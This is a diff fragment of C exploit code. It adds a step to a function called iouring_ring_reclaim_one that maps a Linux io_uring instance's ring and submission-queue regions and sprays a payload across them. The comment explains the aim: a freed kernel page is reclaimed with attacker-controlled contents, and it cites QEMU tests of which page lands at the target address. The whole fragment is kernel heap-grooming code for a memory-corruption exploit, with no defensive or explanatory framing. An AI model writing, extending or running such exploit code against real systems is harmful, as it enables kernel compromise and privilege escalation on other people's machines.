@@ -892,6 +892,29 @@ int iouring_ring_reclaim_one(unsigned char *payload, size_t plen,
     return 0;
   }
   size_t sqlen = (size_t)sq_entries * 64;
+  /*
+   * Stamp BOTH io_uring regions: each ring owns TWO order-2 compound
+   * pages — the RINGS struct (offset 0; sq/cq arrays + headers; QEMU
+   * proved THIS page claimed base: its +0x100 held sq_mask/cq_mask/
+   * entries config) and the SQE array (IORING_OFF_SQES). Stamp and
+   * register both so whichever lands at base carries the payload.
+   * The header words (sq head/tail) are userspace-owned; with no
+   * submissions/completions the kernel never rewrites them.
+   */
+  unsigned int cq_entries = 0, cqes_off = 0;
+  memcpy(&cq_entries, params + 4, sizeof(cq_entries));
+  memcpy(&cqes_off, params + 0x60, sizeof(cqes_off));
+  size_t rings_len = (size_t)cqes_off + (size_t)cq_entries * 16;
+  void *rg = mmap(NULL, rings_len, PROT_READ | PROT_WRITE, MAP_SHARED,
+                  (int)fd, 0);
+  if (rg != MAP_FAILED) {
+    if (plen) {
+      for (size_t off = 0; off + plen <= rings_len; off += 0x4000)
+        memcpy((unsigned char *)rg + off, payload, plen);
+    }
+    if (do_register)
+      ring_map_register((unsigned char *)rg, rings_len);
+  }
   void *sq = mmap(NULL, sqlen, PROT_READ | PROT_WRITE, MAP_SHARED, (int)fd,
                   IORING_OFF_SQES);
   if (sq == MAP_FAILED) {
